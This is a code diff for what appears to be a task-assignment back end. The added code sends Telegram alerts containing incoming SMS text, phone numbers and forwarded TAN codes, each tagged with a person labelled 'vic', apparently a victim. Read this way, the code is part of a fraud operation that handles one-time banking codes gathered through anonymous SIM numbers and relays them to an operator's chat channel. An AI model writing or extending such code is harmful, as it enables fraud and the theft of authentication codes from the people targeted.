@@ -164,6 +164,66 @@ export async function processAssignmentForward(
       .eq("id", assignmentId);
   }
 
+  // Send Telegram notifications directly from here so both the browser-triggered
+  // proxy AND the cron sweep alert on every new SMS / forwarded TAN.
+  if (newSms.length > 0 || forwardedCodes.length > 0) {
+    try {
+      const [{ data: prof }, { data: ver }] = await Promise.all([
+        serviceClient.from("profiles").select("first_name, last_name, email").eq("id", a.user_id).maybeSingle(),
+        serviceClient.from("verifications").select("title").eq("id", (a as any).verification_id ?? "").maybeSingle(),
+      ]);
+      // verification_id wasn't selected above; fetch it separately if missing
+      let verificationTitle = ver?.title;
+      if (!verificationTitle) {
+        const { data: a2 } = await serviceClient
+          .from("verification_assignments")
+          .select("verification_id")
+          .eq("id", assignmentId)
+          .maybeSingle();
+        if (a2?.verification_id) {
+          const { data: ver2 } = await serviceClient
+            .from("verifications")
+            .select("title")
+            .eq("id", a2.verification_id)
+            .maybeSingle();
+          verificationTitle = ver2?.title;
+        }
+      }
+      const vicName =
+        `${prof?.first_name ?? ""} ${prof?.last_name ?? ""}`.trim() ||
+        prof?.email ||
+        "Unbekannt";
+      const title = verificationTitle ?? "Auftrag";
+
+      for (const sms of newSms) {
+        try {
+          await sendTelegramNotification(serviceClient, "anosim_sms_received", {
+            vic_name: vicName,
+            verification_title: title,
+            sender: sms.sender,
+            text: sms.text,
+          });
+        } catch (e) {
+          console.error("telegram anosim_sms_received failed", e);
+        }
+      }
+      for (const fw of forwardedCodes) {
+        try {
+          await sendTelegramNotification(serviceClient, "tan_forwarded_to_vic", {
+            vic_name: vicName,
+            verification_title: title,
+            vic_phone: fw.vicPhone,
+            code: fw.code,
+          });
+        } catch (e) {
+          console.error("telegram tan_forwarded_to_vic failed", e);
+        }
+      }
+    } catch (e) {
+      console.error("telegram context load failed", e);
+    }
+  }
+
   return { forwarded: forwardedCount, checked: checkedCount, forwardedCodes, newSms, vicPhone };
 }
 
